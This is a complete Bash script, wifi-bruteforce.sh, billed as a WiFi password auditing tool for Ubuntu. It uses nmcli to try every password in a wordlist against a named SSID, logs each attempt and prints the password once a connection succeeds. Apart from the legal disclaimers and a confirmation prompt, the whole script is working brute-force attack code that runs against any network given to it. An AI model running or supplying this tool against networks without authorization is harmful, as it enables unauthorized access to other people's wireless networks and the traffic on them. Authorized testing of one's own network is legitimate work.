#!/bin/bash

# WiFi Password Auditing Tool for Ubuntu
# WARNING: Only use on networks you own or have explicit authorization to test
# Usage: ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if running with sudo
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: This script must be run with sudo${NC}"
    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
    exit 1
fi

# Check if required arguments are provided
if [ $# -lt 2 ]; then
    echo -e "${RED}Error: Missing arguments${NC}"
    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
    echo "Example: sudo ./wifi-bruteforce.sh MyWiFi /path/to/passwords.txt"
    exit 1
fi

SSID="$1"
WORDLIST="$2"

# Check if wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}Error: Wordlist file '$WORDLIST' not found${NC}"
    exit 1
fi

# Check if NetworkManager is available
if ! command -v nmcli &> /dev/null; then
    echo -e "${RED}Error: nmcli (NetworkManager) is not installed${NC}"
    echo "Install it with: sudo apt install network-manager"
    exit 1
fi

# Legal disclaimer
echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}WiFi Password Security Auditing Tool${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo -e "${RED}WARNING: Only use on networks you own!${NC}"
echo -e "${RED}Unauthorized access is illegal.${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""
echo -e "Target SSID: ${BLUE}$SSID${NC}"
echo -e "Wordlist: ${BLUE}$WORDLIST${NC}"
echo ""

# Count passwords in wordlist
TOTAL_PASSWORDS=$(wc -l < "$WORDLIST")
echo -e "Total passwords to try: ${BLUE}$TOTAL_PASSWORDS${NC}"
echo ""

# Confirm before starting
read -p "Continue with password testing? (yes/no): " CONFIRM
if [ "$CONFIRM" != "yes" ]; then
    echo "Aborted by user."
    exit 0
fi

echo ""
echo -e "${YELLOW}Starting password testing...${NC}"
echo ""

# Log file
LOG_FILE="wifi-audit-$(date +%Y%m%d-%H%M%S).log"
echo "WiFi Password Audit Log - $(date)" > "$LOG_FILE"
echo "Target SSID: $SSID" >> "$LOG_FILE"
echo "Wordlist: $WORDLIST" >> "$LOG_FILE"
echo "----------------------------------------" >> "$LOG_FILE"

# Counter
ATTEMPT=0
FOUND=false

# Disconnect from any current network
echo -e "${BLUE}Disconnecting from current network...${NC}"
nmcli device disconnect wlan0 2>/dev/null
sleep 2

# Try each password
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    # Skip empty lines
    if [ -z "$PASSWORD" ]; then
        continue
    fi

    ATTEMPT=$((ATTEMPT + 1))

    # Progress indicator
    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL_PASSWORDS}]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"

    # Attempt connection
    RESULT=$(nmcli device wifi connect "$SSID" password "$PASSWORD" 2>&1)

    # Check if successful
    if echo "$RESULT" | grep -q "successfully activated"; then
        echo -e "\n${GREEN}=========================================${NC}"
        echo -e "${GREEN}SUCCESS! Password found!${NC}"
        echo -e "${GREEN}=========================================${NC}"
        echo -e "SSID: ${BLUE}$SSID${NC}"
        echo -e "Password: ${GREEN}$PASSWORD${NC}"
        echo -e "${GREEN}=========================================${NC}"

        # Log success
        echo "SUCCESS - Password found: $PASSWORD" >> "$LOG_FILE"
        echo "Attempt number: $ATTEMPT" >> "$LOG_FILE"

        FOUND=true

        # Show connection details
        echo ""
        echo "Connection details:"
        nmcli connection show --active | grep wifi

        break
    else
        # Log failed attempt
        echo "FAILED - Attempt $ATTEMPT: $PASSWORD" >> "$LOG_FILE"

        # Disconnect before next attempt
        nmcli device disconnect wlan0 2>/dev/null
        sleep 1
    fi

done < "$WORDLIST"

echo ""
echo ""

# Final summary
if [ "$FOUND" = true ]; then
    echo -e "${GREEN}Audit completed - Password found after $ATTEMPT attempts${NC}"
else
    echo -e "${RED}Audit completed - Password not found${NC}"
    echo -e "${YELLOW}Tried $ATTEMPT passwords from the wordlist${NC}"
    echo "The password may not be in your wordlist."
fi

echo ""
echo -e "Full log saved to: ${BLUE}$LOG_FILE${NC}"
echo ""
